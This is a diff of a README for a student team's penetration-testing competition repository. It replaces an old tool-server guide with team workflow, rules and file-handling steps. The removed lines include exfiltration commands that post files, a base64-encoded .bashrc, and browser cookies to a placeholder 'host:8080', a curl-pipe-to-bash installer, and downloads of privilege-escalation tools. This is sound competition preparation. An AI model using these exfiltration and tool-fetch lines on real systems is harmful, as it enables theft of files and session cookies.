@@ -1,4 +1,4 @@
-# City College of San Francisco
+# City College of San Francisco Cybersec - CPTC 2026
 
 ```
                     `.:/+ooooo//-.                                .-//ooooo+/:.`                    
@@ -32,75 +32,90 @@
                                      `..:::+ooossssssooo//::-..`
 ```
 
-# Install
+Pre-staged templates, checklists, and scripts for the Collegiate Penetration Testing Competition (CPTC12, Regionals).
+
+## Rules (official rulebook, Oct 2025)
+
+- **This repo is public.** Never put credentials, client data, or anything from the competition environment in here, during or after the event (R3).
+- **During competition hours,** teams "may make changes to the content on their repository … from the Competition Environment."
+- **Be ready to explain anything in `scripts/` and `tools/`.** How each works: `tools/README.md`.
+
+Source: the [official rulebook](https://cp.tc/docs/cptc-rules.pdf).
+
+## Start here
+
+1. `CONVENTIONS.md`: team rules (R1–R18) and naming.
+2. `WORKFLOWS.md`: what to do, in what order.
+3. `checklists/00-kickoff.md`: kickoff.
+
+## Layout
+
+| Path | What it is |
+|---|---|
+| `checklists/` | Run sheets: `00` kickoff, `10` AD, `15` Linux, `20` web, `30` OT-safe, `40` evidence, `50` report QA, `60` AI/LLM |
+| `playbooks/` | Per-technique steps: `windows`, `web`, `linux`, `ot`, `general`, `ai`, `recon`. Start at `playbooks/README.md` |
+| `TOOLS.md` | Tools we use, and what to install if the box is minimal |
+| `templates/` | Finding, report (`.md` and `.docx`), severity, incident, status, inject, tracker CSVs. Marker key: `templates/README.md` |
+| `findings-library/` | Pre-written findings. Copy one into `findings/` on the day |
+| `scripts/`, `tools/` | Logged shell, `pull.sh`, `compile.py`, `notebook.py`. How to run each: `tools/README.md` |
+| `training/` | Study material, practice labs |
+| `archive/` | 2025 repo, kept as is (tag `archive/pre-2026`) |
+| `findings/`, `evidence/`, `field-notes/`, `incoming/`, `build/` | Event files. Live in the working copy, never committed |
+
+## On the day
+
+1. Kickoff: read scope and ROE aloud, write the out-of-scope list on the whiteboard.
+2. Make your working copy (below), start a logged shell in it: `scripts/logged-shell.sh <yourname>`. Optionally start the notebook.
+3. Give each finding an ID the moment you find it, before exploiting further. Allocation is **TBD** (R6: shared doc, or per-person blocks like F-001–F-020).
+4. Finder fills `templates/finding.md` (or a library entry) and hands it to the report writer. Author edits their own file until it is pasted into `report.md`; after that, edit `report.md` (R18). Severity gets one review pass (R8).
+5. If something breaks: stop, tell the team, file `templates/incident-report.md`. Deadline is **TBD**.
+6. Report assembly starts at the halfway point. The report writer copies `templates/report.md` to `~/cptc-work/report.md`.
+7. Before each submission, someone who didn't write it runs `checklists/50-report-qa.md`.
+
+## Working copy
+
+Work in a copy, never in the git clone. At kickoff, each person runs:
 
 ```
-curl -sL https://raw.githubusercontent.com/nationalcptc-teamtools/City-College-of-San-Francisco/main/install.sh | bash -
+<repo-clone>/scripts/make-workcopy.sh <yourname> <repo-clone>
 ```
 
-# http server
+- `<yourname>`: lowercase letters, digits, `-` (e.g. `alice`).
+- Copies only **committed** files into `~/cptc-work`, with no `.git`. Run `git status` in the clone first.
+- Refuses to run if `~/cptc-work` exists. Needs `git`, no `sudo`.
+- **Open every terminal in `~/cptc-work`.** Checklists write scan output to the current directory.
+- Tool fix mid-event: copy the one file, e.g. `cp <repo-clone>/tools/compile.py ~/cptc-work/tools/`.
 
-Run it with the `tools` alias and it'll serve files from `~/tools`, and allow some exfil.
+## Notebook
 
-## exfil
-
-### Powershell
-
-```
-Invoke-RestMethod -Uri http://host:8080/win-file/output-file-name.ext -Method Post -InFile input-file-name.ext
-```
-
-### Base64 File Exfil in url
-
-You can exfil file contents in base64 as part of the url.  Just make a request similar to the following
+A local web page for your checklists, files and notes. Start it inside the working copy:
 
 ```
-curl "http://host:8080/b64-file/path/output-filename?f=$(base64 --wrap=0 .bashrc)"
+python3 tools/notebook.py --name <yourname>
 ```
 
-### Log base64 contents
+Open the address it prints. It does:
+- **Checklists:** not todos, but guides.
+- **Your files:** list `findings/` and `field-notes/<yourname>/`, make new ones from the templates, fill in the `[[markers]]` with autosave.
+- **Export:** one zip of your files for the report writer.
 
-Example for in browser, this will just log the cookie contents to stdout.
+Local only (`127.0.0.1`). Everything works without it. Details: `tools/README.md`.
 
-```
-fetch('http://host:8080/b64/' + btoa(document.cookie));
-```
+## Getting files to the report writer
 
-### curl
+Use the first that works. Files land in `~/cptc-work/incoming/<name>/`.
 
-```
-curl -F 'output-filename=@./path/input-file-name' http://host:8080/upload
-```
+1. **Shared storage from the officials**, if offered.
+2. **`scripts/pull.sh`** over SSH, run by the report writer in `~/cptc-work`:
+   ```
+   scripts/pull.sh --setup    # once: each teammate's name, login, IP
+   scripts/pull.sh            # pull everyone
+   scripts/pull.sh alice      # pull one
+   ```
+   Each teammate first changes the default `kali` password, starts ssh (`sudo systemctl start ssh`) and has `rsync`. Details and failures: `tools/README.md`.
+3. **Export zip**, moved by hand (RDP drive, `scp`). Unpack fresh each time:
+   `rm -rf ~/cptc-work/incoming/alice && unzip <file> -d ~/cptc-work/incoming/alice/`
 
-## Tool retrieval
+`incoming/` is a read-only mirror. Nobody edits it; every pull overwrites it. Fix a finding in its author's `findings/`, or in `report.md` once pasted.
 
-Some available files:
-* chisel.exe
-* chisel - linux binary
-* winpeas.bat
-* winpeas.exe
-* win-privesc.zip - all modules from PowerSploit/PrivEsc
-* win-recon.zip - all modules from PowerSploit/Recon
-* linpeas.sh
-* powerview.ps1
-* pspy64 - statically linked pspy version
-* various statically linked linux binaries in /linux-bin
-* various statically linked windows binaries in /win-bin
-
-### Windows
-
-```
-Invoke-WebRequest -Uri 'http://host:8080/winpeas.bat' -OutFile .\winpeas.bat
-wget http://host:8080/winpeas.bat -outfile winpeas.bat
-```
-
-### Linux
-
-```
-curl http://host:8080/linpeas.sh -o lp.sh
-wget http://host:8080/linpeas.sh
-```
-
-## SMB Server
-
-Serve tools from `~/tools` with the `smb` alias
+**Rules check:** external private storage and peer-to-peer file sharing are banned. Copying between our own boxes inside the environment is fine (`sftp`/`rsync` confirmed). Never move event data outside the environment.
